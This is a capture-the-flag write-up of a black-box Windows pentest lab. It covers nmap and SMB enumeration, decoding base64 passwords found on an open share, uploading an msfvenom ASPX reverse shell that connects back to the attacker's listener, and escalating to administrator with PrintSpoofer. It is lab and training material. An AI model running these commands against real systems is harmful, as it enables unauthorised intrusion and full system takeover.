#CTF 


You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

**Scope of Work**

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

- User.txt
- Root.txt  

Additionally, the client has provided the following scope allowances:

- Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first  
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope
- Find and report ALL vulnerabilities (yes, there is more than one path to root)

(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.

Note - Nothing in this room requires Metasploit

Machine may take up to 5 minutes for all services to start.  

****Writeups will not be accepted for this room.****

## Recon

```
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2023-06-14T20:48:13
|_Not valid after:  2023-12-14T20:48:13
|_ssl-date: 2023-06-15T21:14:35+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2023-06-15T21:13:55+00:00
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-06-15T21:13:58
|_  start_date: 2023-06-15T20:48:37
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h23m58s, deviation: 3h07m51s, median: -2s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-06-15T14:13:57-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)


```

`smbclient -L [ip]`
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.118.30 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
  
```

Gobuster
`gobuster dir -u http://[ip]:49663/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -no-error -t 50`
```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.118.30:49663/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/15 17:30:16 Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 163] [--> http://10.10.118.30:49663/aspnet_client/]
Progress: 4579 / 4615 (99.22%)
===============================================================
2023/06/15 17:30:53 Finished

```

## Access

There is an interesting share named nt4wrksv. I will try to access it
`smbclient  //[ip]/nt4wrksv -U nt4wrksv`
And I am in without password. I find a file named passwords.txt
```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk 
```

I use base64 to decode them
`Bob - !P@$$W0rD!123 `
`Bill - Juw4nnaM4n420696969!$$$`

I am going to create a reverse shell with msfvenom
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[local ip] LPORT=443 -f aspx > relevant.aspx
```

I connect to the nt4wrksv share via smbclient as before and put  relevant.aspx on the machine.
Then I open a Netcat connection on port 443.
Lastly I curl my file like `curl http://[ip]:49663/nt4wrksv/relevant.aspx`
And I have a connection
I find user flag under `c:\Users\Bob\Desktop>`

## Priv Esc

Similar to sudo -l I type `whoami /priv`

```
PRIVILEGES INFORMATION                                                                  
----------------------                                                                  
Privilege Name                Description                               State           
============================= ========================================= ========       
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled       
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled        
SeAuditPrivilege              Generate security audits                  Disabled        
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled         
SeImpersonatePrivilege        Impersonate a client after authentication Enabled         
SeCreateGlobalPrivilege       Create global objects                     Enabled         
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled  
```

I found out that `SeImpersonatePrivilege        Impersonate a client after authentication Enabled  `, is promising.
Searching online I found PrintSpoofer64.exe
This is a tool to impersonate the Admin.
So I downloaded it. Then opened a smbclient session with nt4wrksv, I putted PrintSpoofer64.exe and logged out.

Next I logged in the machine with curl as before, navigated to the uploaded files under
`c:\inetpub\wwwroot\nt4wrksv`
and typed `PrintSpoofer64.exe -i -c powershell`
And I was root!
I found the flag under `C:\Users\Administrator\Desktop>`
